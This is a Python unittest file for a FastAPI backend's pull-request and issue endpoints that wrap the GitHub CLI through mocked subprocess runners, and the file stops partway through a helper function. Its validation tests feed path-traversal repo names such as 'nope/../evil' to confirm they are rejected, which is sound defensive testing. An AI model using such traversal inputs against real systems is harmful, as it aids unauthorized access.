"""Tests for the pulls + issues routers (subprocess mocked).

Covers the ports of buttons/server.py GET /prs, GET /pr-details,
POST /pr-action, POST /repair/dispatch, GET /repair/status,
GET /issues, POST /create-issue,
POST /issue-draft: shapes, validation errors, and pr-action gates.
"""

import json
import os
import tempfile
import threading
import time
import unittest
from unittest.mock import patch

from backend.api.routers import issues as issues_mod
from backend.api.routers import pulls as pulls_mod
from backend.api.routers.issues import (
    parse_issue_number,
    repair_state,
    repair_state_lock,
    trigger_repair,
)
from backend.api.routers.pulls import _pr_action, ci_label
from backend import pr_gates


class FakeProc:
    def __init__(self, stdout="", stderr="", returncode=0):
        self.stdout = stdout
        self.stderr = stderr
        self.returncode = returncode

    def wait(self, timeout=None):
        return self.returncode

    def terminate(self):
        pass

    def kill(self):
        pass


class FakeRunner:
    """subprocess-like fake: argv[0] argv[1:] -> FakeProc."""

    def __init__(self):
        self.calls = []
        self.handlers = {}

    def on(self, prefix, proc):
        self.handlers[tuple(prefix)] = proc
        return self

    def run(self, argv, **kwargs):
        self.calls.append(list(argv))
        for prefix, proc in self.handlers.items():
            if list(argv[: len(prefix)]) == list(prefix):
                return proc
        raise AssertionError(f"unexpected argv: {argv}")

    def Popen(self, argv, **kwargs):  # repair worker path
        self.calls.append(list(argv))
        proc = self.handlers.get("popen")
        if proc is None:
            raise AssertionError(f"unexpected Popen: {argv}")
        return proc


def gh_list_prs():
    return json.dumps([{
        "number": 7, "title": "Fix thing", "isDraft": False,
        "mergeable": "MERGEABLE", "reviewDecision": "APPROVED",
        "headRefName": "fix-thing",
        "statusCheckRollup": [
            {"name": "ci", "conclusion": "SUCCESS", "status": "COMPLETED"}
        ],
        "url": "https://github.com/arii/remote-server/pull/7",
        "author": {"login": "octo"},
    }])


def gh_pr_view(ci_conclusion="SUCCESS", merge="CLEAN", review="APPROVED"):
    status = "COMPLETED" if ci_conclusion != "IN_PROGRESS" else "IN_PROGRESS"
    concl = ci_conclusion if ci_conclusion != "IN_PROGRESS" else ""
    return json.dumps({
        "number": 7, "title": "Fix thing", "headRefName": "fix-thing",
        "baseRefName": "main", "mergeable": "MERGEABLE",
        "mergeStateStatus": merge, "reviewDecision": review,
        "statusCheckRollup": [{"name": "ci", "conclusion": concl,
                               "status": status}],
        "updatedAt": "2026-01-01T00:00:00Z",
        "author": {"login": "octo"}, "isDraft": False,
        "url": "https://github.com/arii/remote-server/pull/7",
        "files": [{"path": "a.py", "additions": 3, "deletions": 1}],
    })


def gh_issue_list():
    return json.dumps([{
        "number": 3, "title": "Bug", "state": "OPEN",
        "assignees": [], "labels": [],
        "updatedAt": "2026-01-01T00:00:00Z",
        "url": "https://github.com/arii/remote-server/issues/3",
        "body": "x" * 700,
    }])


class CiLabelTest(unittest.TestCase):
    def test_labels(self):
        self.assertEqual(ci_label(None), "unknown")
        self.assertEqual(ci_label([]), "no checks")
        self.assertEqual(
            ci_label([{"conclusion": "FAILURE", "status": "COMPLETED"}]),
            "failing")
        self.assertEqual(
            ci_label([{"conclusion": "", "status": "IN_PROGRESS"}]),
            "pending")
        self.assertEqual(
            ci_label([{"conclusion": "SUCCESS", "status": "COMPLETED"}]),
            "passing")


PR_VIEW_GATE_ARGV = ["gh", "pr", "view", "7", "--repo",
                     "arii/remote-server", "--json",
                     "statusCheckRollup,mergeStateStatus,"
                     "reviewDecision"]
PR_DIFF_ARGV = ["gh", "pr", "diff", "7", "--repo",
                "arii/remote-server"]


class PrsTest(unittest.TestCase):
    def test_list_shapes_rows(self):
        runner = FakeRunner().on(
            ["gh", "pr", "list"], FakeProc(stdout=gh_list_prs())).on(
            ["gh", "api", "user"], FakeProc(stdout="octo"))
        out = pulls_mod.prs(repo="remote-server", runner=runner)
        self.assertEqual(out["repo"], "remote-server")
        self.assertEqual(
            runner.calls,
            [["gh", "pr", "list", "--repo", "arii/remote-server",
              "--state", "open", "--limit", "50",
              "--json", pulls_mod.PR_LIST_FIELDS],
             ["gh", "api", "user", "--jq", ".login"]])
        row = out["prs"][0]
        self.assertEqual(
            (row["number"], row["title"], row["author"], row["branch"],
             row["ciStatus"], row["ciLabel"], row["reviewDecision"],
             row["mergeable"]),
            (7, "Fix thing", "octo", "fix-thing", "passing", "passing",
             "APPROVED", "MERGEABLE"))
        # #848: an APPROVED decision means reviews are in play, and
        # the list carries the viewer login for self-approval checks.
        self.assertTrue(row["reviewRequired"])
        self.assertEqual(out["viewer"], "octo")

    def test_list_rows_carry_updated_at(self):
        # Backend follow-up for #817: Review sort orders by updatedAt.
        import json as _json

        payload = _json.dumps([{
            "number": 7, "title": "Fix thing", "isDraft": False,
            "mergeable": "MERGEABLE", "reviewDecision": "APPROVED",
            "headRefName": "fix-thing", "statusCheckRollup": [],
            "url": "https://github.com/arii/remote-server/pull/7",
            "author": {"login": "octo"},
            "updatedAt": "2026-11-03T10:00:00Z",
        }])
        runner = FakeRunner().on(["gh"], FakeProc(stdout=payload))
        out = pulls_mod.prs(repo="remote-server", runner=runner)
        row = out["prs"][0]
        self.assertEqual(row["updatedAt"], "2026-11-03T10:00:00Z")
        self.assertEqual(
            pulls_mod.PrRow(**row).updatedAt, "2026-11-03T10:00:00Z")

    def test_list_updated_at_defaults_empty(self):
        runner = FakeRunner().on(
            ["gh"], FakeProc(stdout=gh_list_prs()))
        out = pulls_mod.prs(repo="remote-server", runner=runner)
        self.assertEqual(out["prs"][0]["updatedAt"], "")

    def test_list_bad_repo(self):
        from fastapi import HTTPException

        with self.assertRaises(HTTPException) as ctx:
            pulls_mod.prs(repo="nope/../evil")
        self.assertEqual(ctx.exception.status_code, 400)

    def test_list_gh_failure_is_500(self):
        from fastapi import HTTPException

        runner = FakeRunner().on(
            ["gh"], FakeProc(stderr="boom", returncode=1))
        with self.assertRaises(HTTPException) as ctx:
            pulls_mod.prs(repo="remote-server", runner=runner)
        self.assertEqual(ctx.exception.status_code, 500)
        self.assertEqual(
            runner.calls,
            [["gh", "pr", "list", "--repo", "arii/remote-server",
              "--state", "open", "--limit", "50",
              "--json", pulls_mod.PR_LIST_FIELDS]])


class PrDetailsTest(unittest.TestCase):
    def test_details_shape(self):
        runner = FakeRunner().on(["gh"], FakeProc(stdout=gh_pr_view()))
        out = pulls_mod.pr_details(repo="remote-server", pr=7,
                                   runner=runner)
        self.assertEqual(
            (out["number"], out["ci"], out["merge"],
             out["conflicted"], len(out["ai_prompts"])),
            (7, "passing", "clean", False, 5))
        self.assertEqual(out["stats"]["total_files"], 1)
        self.assertEqual(out["files"][0]["changes"], 4)
        self.assertEqual(
            runner.calls,
            [["gh", "pr", "view", "7", "--repo",
              "arii/remote-server", "--json",
              pulls_mod.PR_VIEW_FIELDS]])

    def test_details_bad_pr(self):
        from fastapi import HTTPException

        runner = FakeRunner()
        with self.assertRaises(HTTPException) as ctx:
            pulls_mod.pr_details(repo="remote-server", pr=0,
                                 runner=runner)
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertEqual(runner.calls, [])


class PrDiffTest(unittest.TestCase):
    DIFF = ("diff --git a/app.py b/app.py\n"
            "--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n"
            "-print(1)\n+print(2)\n")
    STRUCT_DIFF = (
        "diff --git a/pnpm-lock.yaml b/pnpm-lock.yaml\n"
        "--- a/pnpm-lock.yaml\n+++ b/pnpm-lock.yaml\n@@ -1 +1 @@\n"
        "-foo: 1.0.0\n+foo: 1.0.1\n"
        "diff --git a/dist/app.bundle.js b/dist/app.bundle.js\n"
        "--- a/dist/app.bundle.js\n+++ b/dist/app.bundle.js\n"
        "@@ -1 +1 @@\n-var a=1;\n+var a=2;\n"
        "diff --git a/app.py b/app.py\n"
        "--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n"
        "-print(1)\n+print(2)\n")

    def test_diff_shape(self):
        runner = FakeRunner().on(["gh"], FakeProc(stdout=self.DIFF))
        out = pulls_mod.pr_diff(repo="remote-server", pr=7,
                                runner=runner)
        self.assertEqual(out["number"], 7)
        self.assertIn("+print(2)", out["diff"])
        self.assertFalse(out["truncated"])
        self.assertEqual(out["hidden_structural"],
                         {"count": 0, "files": []})
        self.assertEqual(runner.calls, [PR_DIFF_ARGV])

    def test_diff_reports_hidden_structural(self):
        runner = FakeRunner().on(
            ["gh"], FakeProc(stdout=self.STRUCT_DIFF))
        out = pulls_mod.pr_diff(repo="remote-server", pr=7,
                                runner=runner)
        self.assertEqual(out["hidden_structural"],
                         {"count": 2,
                          "files": ["pnpm-lock.yaml",
                                    "dist/app.bundle.js"]})
        self.assertNotIn("foo: 1.0.1", out["diff"])
        self.assertNotIn("var a=2", out["diff"])
        self.assertIn("+print(2)", out["diff"])
        self.assertEqual(runner.calls, [PR_DIFF_ARGV])

    def test_diff_truncates_huge_output(self):
        big = self.DIFF * 5000
        runner = FakeRunner().on(["gh"], FakeProc(stdout=big))
        out = pulls_mod.pr_diff(repo="remote-server", pr=7,
                                runner=runner)
        self.assertTrue(out["truncated"])
        self.assertLessEqual(len(out["diff"]), 30000)
        self.assertEqual(runner.calls, [PR_DIFF_ARGV])

    def test_diff_bad_pr(self):
        from fastapi import HTTPException

        runner = FakeRunner()
        with self.assertRaises(HTTPException) as ctx:
            pulls_mod.pr_diff(repo="remote-server", pr=0,
                              runner=runner)
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertEqual(ctx.exception.detail, "invalid pr")
        self.assertEqual(runner.calls, [])

    def test_diff_rejects_bool_pr(self):
        from fastapi import HTTPException

        for bad in (True, False, -1):
            runner = FakeRunner()
            with self.assertRaises(HTTPException) as ctx:
                pulls_mod.pr_diff(repo="remote-server", pr=bad,
                                  runner=runner)
            self.assertEqual(ctx.exception.status_code, 400)
            self.assertEqual(ctx.exception.detail, "invalid pr")
            self.assertEqual(runner.calls, [], bad)

    def test_diff_gh_failure_is_500(self):
        from fastapi import HTTPException

        runner = FakeRunner().on(
            ["gh"], FakeProc(stderr="boom", returncode=1))
        with self.assertRaises(HTTPException) as ctx:
            pulls_mod.pr_diff(repo="remote-server", pr=7,
                              runner=runner)
        self.assertEqual(ctx.exception.status_code, 500)
        self.assertEqual(runner.calls, [PR_DIFF_ARGV])


class RunGhGuardTest(unittest.TestCase):
    def test_run_gh_rejects_unscoped_argv(self):
        from backend.gh import run_gh

        runner = FakeRunner().on(["gh"], FakeProc(stdout="ok"))
        with self.assertRaises(ValueError):
            run_gh("arii/remote-server", ["pr", "merge", "7"],
                   runner=runner)
        self.assertEqual(runner.calls, [])

    def test_run_gh_accepts_scoped_argv(self):
        from backend.gh import run_gh

        runner = FakeRunner().on(["gh"], FakeProc(stdout="ok"))
        out = run_gh("arii/remote-server",
                     ["pr", "merge", "7", "--repo",
                      "arii/remote-server"],
                     runner=runner)
        self.assertEqual(out, "ok")
        # Self-scoped api URL needs no --repo (update-branch path).
        out = run_gh("arii/remote-server",
                     ["api", "repos/arii/remote-server/pulls/7",
                      "--method", "GET"],
                     runner=runner)
        self.assertEqual(out, "ok")
        self.assertEqual(
            runner.calls,
            [["gh", "pr", "merge", "7", "--repo",
              "arii/remote-server"],
             ["gh", "api", "repos/arii/remote-server/pulls/7",
              "--method", "GET"]])


class PrActionTest(unittest.TestCase):
    def test_merge_gate_refuses_dirty_ci(self):
        runner = FakeRunner().on(
            ["gh"], FakeProc(stdout=gh_pr_view("FAILURE", "DIRTY")))
        with self.assertRaises(ValueError):
            _pr_action("arii/remote-server", 7, "merge", runner=runner)
        # The gate refused, but the gating view still ran — scoped.
        self.assertEqual(runner.calls, [PR_VIEW_GATE_ARGV])

    def test_merge_ok(self):
        runner = FakeRunner().on(
            ["gh", "pr", "view"], FakeProc(stdout=gh_pr_view())).on(
            ["gh", "pr", "merge"], FakeProc(stdout="merged"))
        out = _pr_action("arii/remote-server", 7, "merge",
                         runner=runner)
        self.assertTrue(out["ok"])
        self.assertEqual(
            runner.calls,
            [PR_VIEW_GATE_ARGV,
             ["gh", "pr", "merge", "7", "--repo",
              "arii/remote-server", "--squash",
              "--delete-branch"]])

    def test_merge_argv_scoped_to_repo(self):
        runner = FakeRunner().on(
            ["gh", "pr", "view"], FakeProc(stdout=gh_pr_view())).on(
            ["gh", "pr", "merge"], FakeProc(stdout="merged"))
        out = _pr_action("arii/remote-server", 7, "merge",
                         runner=runner)
        self.assertTrue(out["ok"])
        # --repo is explicit: regression guard for #544 (an unscoped
        # merge resolves against the backend cwd, not the gated repo).
        self.assertEqual(
            runner.calls,
            [PR_VIEW_GATE_ARGV,
             ["gh", "pr", "merge", "7", "--repo",
              "arii/remote-server", "--squash",
              "--delete-branch"]])

    def test_update_only_behind(self):
        runner = FakeRunner().on(
            ["gh"], FakeProc(stdout=gh_pr_view("SUCCESS", "CLEAN")))
        with self.assertRaises(ValueError):
            _pr_action("arii/remote-server", 7, "update", runner=runner)
        self.assertEqual(runner.calls, [PR_VIEW_GATE_ARGV])
        runner2 = FakeRunner().on(
            ["gh", "pr", "view"],
            FakeProc(stdout=gh_pr_view("SUCCESS", "BEHIND"))).on(
            ["gh", "api"], FakeProc(stdout="{}"))
        out = _pr_action("arii/remote-server", 7, "update",
                         runner=runner2)
        self.assertTrue(out["ok"])
        self.assertEqual(
            runner2.calls,
            [PR_VIEW_GATE_ARGV,
             ["gh", "api",
              "repos/arii/remote-server/pulls/7/update-branch",
              "--method", "PUT"]])

    def test_fix_ci_retired(self):
        # #428: fix-ci shelled to `td agent fix-ci --execute`, a
        # dead backend dispatch. The action is retired: direct
        # calls fail without touching gh, and the endpoint answers
        # 400 with a note instead of the generic bad-action error.
        runner = FakeRunner().on(
            ["gh"], FakeProc(stdout=gh_pr_view("FAILURE", "DIRTY")))
        with self.assertRaises(ValueError):
            _pr_action("arii/remote-server", 7, "fix-ci", runner=runner)
        self.assertEqual(runner.calls, [])
        self.assertNotIn("fix-ci", pulls_mod.PR_ACTIONS)
        from fastapi import HTTPException

        with self.assertRaises(HTTPException) as ctx:
            pulls_mod.pr_action(pulls_mod.PrActionRequest(
                repo="remote-server", pr_number=7, action="fix-ci"))
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("retired", ctx.exception.detail)

    def test_route_validation(self):
        from fastapi import HTTPException

        for bad in ({"repo": "remote-server", "pr_number": True,
                     "action": "merge"},
                    {"repo": "remote-server", "pr_number": 0,
                     "action": "merge"},
                    {"repo": "remote-server", "pr_number": 7,
                     "action": "explode"}):
            with self.assertRaises(HTTPException) as ctx:
                pulls_mod.pr_action(pulls_mod.PrActionRequest(**bad))
            self.assertEqual(ctx.exception.status_code, 400)

    def test_approve_argv_scoped_to_repo(self):
        runner = FakeRunner().on(
            ["gh", "pr", "review"], FakeProc(stdout="approved"))
        out = _pr_action("arii/remote-server", 7, "approve",
                         runner=runner)
        self.assertTrue(out["ok"])
        # --repo is explicit: regression guard vs #544 (an unscoped
        # verb resolves against the backend cwd, not the repo).
        self.assertEqual(
            runner.calls,
            [["gh", "pr", "review", "7", "--repo",
              "arii/remote-server", "--approve"]])

    def test_request_changes_argv_and_body(self):
        runner = FakeRunner().on(
            ["gh", "pr", "review"], FakeProc(stdout="reviewed"))
        out = _pr_action("arii/remote-server", 7, "request-changes",
                         runner=runner, body="Please fix the leak.")
        self.assertTrue(out["ok"])
        self.assertEqual(
            runner.calls,
            [["gh", "pr", "review", "7", "--repo",
              "arii/remote-server", "--request-changes",
              "-b", "Please fix the leak."]])

    def test_request_changes_body_required(self):
        for bad in ("", "   "):
            with self.assertRaises(ValueError):
                _pr_action("arii/remote-server", 7, "request-changes",
                           runner=FakeRunner(), body=bad)
        with self.assertRaises(ValueError):
            _pr_action("arii/remote-server", 7, "request-changes",
                       runner=FakeRunner(), body="x" * 2001)

    def test_review_confirm_gate(self):
        from fastapi import HTTPException

        for action, intent in (("approve", "pr-approve"),
                               ("request-changes",
                                "pr-request-changes")):
            with self.assertRaises(HTTPException) as ctx:
                pulls_mod.pr_action(pulls_mod.PrActionRequest(
                    repo="remote-server", pr_number=7, action=action))
            self.assertEqual(ctx.exception.status_code, 400)
            self.assertIn("confirmation", ctx.exception.detail)
            # A confirmed intent for another action does not pass.
            with self.assertRaises(HTTPException) as ctx:
                pulls_mod.pr_action(pulls_mod.PrActionRequest(
                    repo="remote-server", pr_number=7, action=action,
                    intent="pr-merge", confirmed=True))
            self.assertEqual(ctx.exception.status_code, 400)
            self.assertIn("confirmation", ctx.exception.detail)

    def test_review_confirmed_posts(self):
        with patch.object(
                pulls_mod, "_pr_action",
                return_value={"ok": True, "output": "posted"}) as m:
            out = pulls_mod.pr_action(pulls_mod.PrActionRequest(
                repo="remote-server", pr_number=7, action="approve",
                intent="pr-approve", confirmed=True))
            self.assertTrue(out["ok"])
            m.assert_called_once_with("arii/remote-server", 7,
                                      "approve", body="")

    def test_request_changes_route_rejects_empty_body(self):
        from fastapi import HTTPException

        with self.assertRaises(HTTPException) as ctx:
            pulls_mod.pr_action(pulls_mod.PrActionRequest(
                repo="remote-server", pr_number=7,
                action="request-changes",
                intent="pr-request-changes", confirmed=True))
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("review body", ctx.exception.detail)

    def test_explicit_branch_validated_then_action_runs(self):
        # Explicit branch (#708): validated against the checkout,
        # then the action proceeds exactly as today.
        with patch.object(
                pulls_mod, "_pr_action",
                return_value={"ok": True, "output": "posted"}) as m, \
                patch("backend.core.validate_action_branch",
                      return_value="main") as branch_mock:
            out = pulls_mod.pr_action(pulls_mod.PrActionRequest(
                repo="remote-server", pr_number=7, action="approve",
                intent="pr-approve", confirmed=True, branch="main"))
            self.assertTrue(out["ok"])
            branch_mock.assert_called_once_with("remote-server", "main")
            m.assert_called_once_with("arii/remote-server", 7,
                                      "approve", body="")

    def test_unknown_branch_rejected_before_action(self):
        from fastapi import HTTPException

        with patch.object(pulls_mod, "_pr_action") as m, \
                patch("backend.core.validate_action_branch",
                      side_effect=ValueError("unknown branch: 'gone'")):
            with self.assertRaises(HTTPException) as ctx:
                pulls_mod.pr_action(pulls_mod.PrActionRequest(
                    repo="remote-server", pr_number=7, action="merge",
                    intent="pr-merge", confirmed=True, branch="gone"))
            self.assertEqual(ctx.exception.status_code, 400)
            self.assertIn("unknown branch", ctx.exception.detail)
            m.assert_not_called()

    def test_omitted_branch_validates_blank(self):
        # Omitted branch reaches validation as "" (short-circuited
        # without git): behavior is today's.
        with patch.object(
                pulls_mod, "_pr_action",
                return_value={"ok": True, "output": "posted"}), \
                patch("backend.core.validate_action_branch",
                      return_value="") as branch_mock:
            out = pulls_mod.pr_action(pulls_mod.PrActionRequest(
                repo="remote-server", pr_number=7, action="approve",
                intent="pr-approve", confirmed=True))
            self.assertTrue(out["ok"])
            branch_mock.assert_called_once_with("remote-server", "")


class ApproveMergeGate848Test(unittest.TestCase):
    """Console approve/merge gating for self-authored PRs (#848)."""

    def test_approve_own_pr_is_400_not_500(self):
        runner = FakeRunner().on(
            ["gh", "pr", "review"],
            FakeProc(stderr="GraphQL: Can not approve your own "
                            "pull request",
                     returncode=1))
        with self.assertRaises(ValueError) as ctx:
            _pr_action("arii/remote-server", 7, "approve",
                       runner=runner)
        # ValueError (not RuntimeError) so the endpoint answers 400.
        self.assertNotIsInstance(ctx.exception, RuntimeError)
        self.assertIn("own PR", str(ctx.exception))

    def test_approve_other_errors_still_raise(self):
        runner = FakeRunner().on(
            ["gh", "pr", "review"],
            FakeProc(stderr="GraphQL: something else broke",
                     returncode=1))
        with self.assertRaises(RuntimeError):
            _pr_action("arii/remote-server", 7, "approve",
                       runner=runner)

    def test_approve_own_pr_endpoint_returns_400(self):
        from fastapi import HTTPException

        with patch.object(
                pulls_mod, "run_gh",
                side_effect=RuntimeError(
                    "Can not approve your own pull request")):
            with self.assertRaises(HTTPException) as ctx:
                pulls_mod.pr_action(pulls_mod.PrActionRequest(
                    repo="remote-server", pr_number=7,
                    action="approve", intent="pr-approve",
                    confirmed=True))
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("own PR", ctx.exception.detail)

    def test_merge_refuses_review_required(self):
        runner = FakeRunner().on(
            ["gh"], FakeProc(stdout=gh_pr_view(
                "SUCCESS", "CLEAN", "REVIEW_REQUIRED")))
        with self.assertRaises(ValueError) as ctx:
            _pr_action("arii/remote-server", 7, "merge",
                       runner=runner)
        self.assertIn("REVIEW_REQUIRED", str(ctx.exception))
        self.assertEqual(runner.calls, [PR_VIEW_GATE_ARGV])

    def test_merge_refuses_changes_requested(self):
        runner = FakeRunner().on(
            ["gh"], FakeProc(stdout=gh_pr_view(
                "SUCCESS", "CLEAN", "CHANGES_REQUESTED")))
        with self.assertRaises(ValueError) as ctx:
            _pr_action("arii/remote-server", 7, "merge",
                       runner=runner)
        self.assertIn("changes were requested", str(ctx.exception))

    def test_merge_allows_blank_decision(self):
        # Blank decision = no required-review rule: a green PR merges.
        runner = FakeRunner().on(
            ["gh", "pr", "view"],
            FakeProc(stdout=gh_pr_view("SUCCESS", "CLEAN", ""))).on(
            ["gh", "pr", "merge"], FakeProc(stdout="merged"))
        out = _pr_action("arii/remote-server", 7, "merge",
                         runner=runner)
        self.assertTrue(out["ok"])

    def test_rows_flag_blank_decision_not_required(self):
        payload = json.dumps([
            {"number": 7, "title": "Reviewed", "isDraft": False,
             "mergeable": "MERGEABLE", "reviewDecision": "APPROVED",
             "headRefName": "a", "statusCheckRollup": [],
             "url": "https://example.invalid/7",
             "author": {"login": "octo"}},
            {"number": 9, "title": "Unreviewed", "isDraft": False,
             "mergeable": "MERGEABLE", "reviewDecision": None,
             "headRefName": "b", "statusCheckRollup": [],
             "url": "https://example.invalid/9",
             "author": {"login": "octo"}},
        ])
        runner = FakeRunner().on(
            ["gh", "pr", "list"], FakeProc(stdout=payload)).on(
            ["gh", "api", "user"], FakeProc(stdout="octo"))
        out = pulls_mod.prs(repo="remote-server", runner=runner)
        rows = {r["number"]: r for r in out["prs"]}
        self.assertTrue(rows[7]["reviewRequired"])
        self.assertEqual(rows[9]["reviewDecision"], "")
        self.assertFalse(rows[9]["reviewRequired"])
        self.assertEqual(out["viewer"], "octo")

    def test_viewer_failure_fails_open(self):
        runner = FakeRunner().on(
            ["gh", "pr", "list"],
            FakeProc(stdout=gh_list_prs())).on(
            ["gh", "api", "user"],
            FakeProc(stderr="auth error", returncode=1))
        out = pulls_mod.prs(repo="remote-server", runner=runner)
        self.assertEqual(out["viewer"], "")
        self.assertEqual(len(out["prs"]), 1)

    def test_viewer_rejects_garbage(self):
        for stdout in ("", "   ", "[1, 2]", "a/b", '"quoted login"'):
            runner = FakeRunner().on(
                ["gh", "pr", "list"],
                FakeProc(stdout=gh_list_prs())).on(
                ["gh", "api", "user"], FakeProc(stdout=stdout))
            out = pulls_mod.prs(repo="remote-server", runner=runner)
            self.assertEqual(out["viewer"], "",
                             f"stdout={stdout!r}")


class IssuesTest(unittest.TestCase):
    def test_list_truncates_body(self):
        with patch.object(issues_mod, "run_gh_json",
                          return_value=json.loads(gh_issue_list())
                          ) as m:
            out = issues_mod.issues(repo="remote-server")
        self.assertEqual(len(out["issues"]), 1)
        self.assertTrue(out["issues"][0]["body"].endswith("…"))
        self.assertEqual(len(out["issues"][0]["body"]), 601)
        gh, argv = m.call_args[0][0], m.call_args[0][1]
        self.assertEqual(gh, "arii/remote-server")
        self.assertEqual(
            argv,
            ["issue", "list", "--repo", "arii/remote-server",
             "--state", "open", "--limit", "50",
             "--json", issues_mod.ISSUE_LIST_FIELDS])

    def test_rollup_tags_rows_and_skips_failed_repos(self):
        with patch.object(
                issues_mod, "list_issue_repo_names",
                return_value=["tech-dancer", "portfolio",
                              "boomtick"]):
            def fake_list(repo):
                if repo == "portfolio":
                    raise RuntimeError("gh down")
                return [{"number": 1, "title": f"{repo} issue",
                         "body": "x"}]

            with patch.object(issues_mod, "list_open_issues",
                              side_effect=fake_list):
                out = issues_mod.issues(repo="all")
        self.assertEqual(out["repo"], "all")
        self.assertEqual(
            [(r["repo"], r["number"], r["title"])
             for r in out["issues"]],
            [("tech-dancer", 1, "tech-dancer issue"),
             ("boomtick", 1, "boomtick issue")])

    def test_per_repo_errors_unchanged_by_rollup(self):
        from fastapi import HTTPException

        with self.assertRaises(HTTPException) as ctx:
            issues_mod.issues(repo="nope/..")
        self.assertEqual(ctx.exception.status_code, 400)
        # A ValueError out of the read (e.g. gh JSON decode) is a
        # 500, exactly as before the seam extraction.
        with patch.object(issues_mod, "list_open_issues",
                          side_effect=ValueError("bad json")):
            with self.assertRaises(HTTPException) as ctx:
                issues_mod.issues(repo="remote-server")
        self.assertEqual(ctx.exception.status_code, 500)

    def test_create_validation_and_url(self):
        from fastapi import HTTPException

        with self.assertRaises(HTTPException):
            issues_mod.create_issue(issues_mod.CreateIssueRequest(
                repo="remote-server", title="   ", body="b"))
        with self.assertRaises(HTTPException):
            issues_mod.create_issue(issues_mod.CreateIssueRequest(
                repo="remote-server", title="t", body="x" * 4001))
        with patch.object(
                issues_mod, "run_gh",
                return_value="https://github.com/arii/remote-server/issues/9\n"
        ) as m:
            out = issues_mod.create_issue(issues_mod.CreateIssueRequest(
                repo="remote-server", title="t", body="b"))
            gh, argv = m.call_args[0][0], m.call_args[0][1]
            self.assertEqual(gh, "arii/remote-server")
            self.assertEqual(
                argv,
                ["issue", "create", "--repo", "arii/remote-server",
                 "--title", "t", "--body", "b"])
            self.assertNotIn(";", " ".join(argv))
        self.assertTrue(out["url"].endswith("/issues/9"))

    def test_create_labels_round_trip(self):
        label_rows = [{"name": "ready"}, {"name": "bug"}]
        with patch.object(issues_mod, "run_gh_json",
                          return_value=label_rows):
            with patch.object(
                    issues_mod, "run_gh",
                    return_value=("https://github.com/arii/remote-server"
                                  "/issues/9\n")) as m:
                out = issues_mod.create_issue(
                    issues_mod.CreateIssueRequest(
                        repo="remote-server", title="t", body="b",
                        labels=["ready", "bug"]))
        gh, argv = m.call_args[0][0], m.call_args[0][1]
        self.assertEqual(gh, "arii/remote-server")
        self.assertEqual(
            argv,
            ["issue", "create", "--repo", "arii/remote-server",
             "--title", "t", "--body", "b",
             "--label", "ready", "--label", "bug"])
        self.assertTrue(out["url"].endswith("/issues/9"))

    def test_create_labels_rejected_with_400(self):
        from fastapi import HTTPException

        with patch.object(issues_mod, "run_gh_json",
                          return_value=[{"name": "ready"}]):
            for bad in (["no-such-label"], ["  "], ["x" * 101],
                        [7], ["ready", "no-such-label"]):
                with self.assertRaises(HTTPException) as ctx:
                    issues_mod.create_issue(
                        issues_mod.CreateIssueRequest(
                            repo="remote-server", title="t", body="b",
                            labels=bad))
                self.assertEqual(ctx.exception.status_code, 400, bad)

    def test_create_labels_canonical_case_and_dedupe(self):
        with patch.object(issues_mod, "run_gh_json",
                          return_value=[{"name": "ready"}]):
            with patch.object(issues_mod, "run_gh",
                              return_value="u\n") as m:
                issues_mod.create_issue(
                    issues_mod.CreateIssueRequest(
                        repo="remote-server", title="t", body="b",
                        labels=["Ready", "ready "]))
        argv = m.call_args[0][1]
        self.assertEqual(argv[-2:], ["--label", "ready"])

    def test_issue_draft_shape(self):
        out = issues_mod.issue_draft(issues_mod.IssueDraftRequest(
            repo="remote-server", source="ci", title="T",
            cause="c", details="d"))
        self.assertTrue(out["ok"])
        self.assertEqual(out["title"], "T")
        self.assertIn("ci", out["body"])
        self.assertIn("c", out["body"])
        self.assertIn("d", out["body"])
        self.assertIn("- [ ] Investigate root cause", out["body"])

    def test_issue_draft_pins_scaffold_sections(self):
        # #437: every lane-gate section (td gh validate-issue) is
        # emitted as a `# <section>` header; the old
        # Summary/Cause/Details/Remediation template is gone.
        out = issues_mod.issue_draft(issues_mod.IssueDraftRequest(
            repo="remote-server", source="ci", title="T",
            cause="c", details="d"))
        for section in issues_mod.DRAFT_SCAFFOLD_SECTIONS:
            with self.subTest(section=section):
                self.assertIn(f"# {section}\n", out["body"])
        for old in ("### Summary", "### Likely Cause",
                    "### Details & Context",
                    "### Recommended Remediation"):
            self.assertNotIn(old, out["body"])

    def test_issue_draft_empty_inputs_keep_sections(self):
        out = issues_mod.issue_draft(issues_mod.IssueDraftRequest(
            repo="remote-server", source="ci", title="T"))
        for section in issues_mod.DRAFT_SCAFFOLD_SECTIONS:
            with self.subTest(section=section):
                self.assertIn(f"# {section}\n", out["body"])


class ParseIssueNumberTest(unittest.TestCase):
    def test_forms(self):
        self.assertEqual(parse_issue_number(12), 12)
        self.assertEqual(parse_issue_number("12"), 12)
        self.assertEqual(parse_issue_number("#12"), 12)
        self.assertEqual(
            parse_issue_number(
                "https://github.com/arii/remote-server/issues/12"), 12)
        for bad in (None, True, 0, -1, "", "abc", "0"):
            self.assertIsNone(parse_issue_number(bad), bad)


class BlockingProc:
    """Fake repair worker that runs until terminated."""

    def __init__(self):
        self._done = threading.Event()
        self.terminated = False

    @property
    def stdout(self):
        yield "working\n"
        self._done.wait(10)

    def poll(self):
        return None if not self._done.is_set() else -15

    def wait(self, timeout=None):
        self._done.wait(timeout)
        return -15

    def terminate(self):
        self.terminated = True
        self._done.set()

    def kill(self):
        self._done.set()


class PreExitedProc(FakeProc):
    """Fake repair worker that already exited with its returncode."""

    def poll(self):
        return self.returncode


class LateAbortProc(FakeProc):
    """Fake repair worker that injects a stale abort flag exactly at
    the race point: after the proc exited, before the worker thread
    records status."""

    def poll(self):
        return self.returncode

    def wait(self, timeout=None):
        with repair_state_lock:
            issues_mod._repair_abort = True
        return self.returncode


class TimeoutProc(FakeProc):
    """Fake worker stuck in wait(): raises TimeoutExpired until killed."""

    def __init__(self):
        super().__init__(stdout=iter([]), returncode=-9)
        self.killed = False

    def wait(self, timeout=None):
        import subprocess as _sub

        if not self.killed:
            raise _sub.TimeoutExpired(cmd="repair", timeout=timeout)
        return self.returncode

    def kill(self):
        self.killed = True


def reset_repair_state():
    with repair_state_lock:
